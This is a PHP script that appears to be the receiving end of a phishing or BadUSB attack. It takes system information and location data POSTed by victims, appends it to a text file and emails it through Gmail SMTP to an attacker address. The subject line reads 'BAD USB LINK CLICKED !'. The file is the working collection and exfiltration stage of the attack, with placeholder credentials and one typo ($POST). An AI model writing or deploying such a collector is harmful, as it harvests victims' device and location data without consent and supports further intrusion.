<?php

$sysinfo_response = $_POST['sysinfo_post'];
$location_response = $POST['location_post'];

//Save response into a file
$myfile = fopen("responses.txt", "a") or die("Unable to open file!");
$responses_final = $sysinfo_response;
fwrite($myfile, $responses_final);
fclose($myfile);




// Send email to firmusphising@gmail.com

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require_once __DIR__ . '/vendor/phpmailer/phpmailer/src/Exception.php';
require_once __DIR__ . '/vendor/phpmailer/phpmailer/src/PHPMailer.php';
require_once __DIR__ . '/vendor/phpmailer/phpmailer/src/SMTP.php';

// passing true in constructor enables exceptions in PHPMailer
$mail = new PHPMailer(true);

try {
    // Server settings
    $mail->SMTPDebug = SMTP::DEBUG_SERVER; // for detailed debug output
    $mail->isSMTP();
    $mail->Host = 'smtp.gmail.com';
    $mail->SMTPAuth = true;
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $mail->Port = 587;

    $mail->Username = 'attacker@gmail.com'; // YOUR gmail email
    $mail->Password = 'test@123'; // YOUR gmail password

    // Sender and recipient settings
    $mail->setFrom('attacker@gmail.com', 'attackername');
    $mail->addAddress('attacker@gmail.com', 'attackername');

    // Setting the email content
    
    $mail->IsHTML(false);
    $mail->Subject = "BAD USB LINK CLICKED !";
    $mail->Body = $responses_final;

    $mail->send();
    echo "Email message sent.";
} catch (Exception $e) {
    echo "Error in sending email. Mailer Error: {$mail->ErrorInfo}";
}


?>
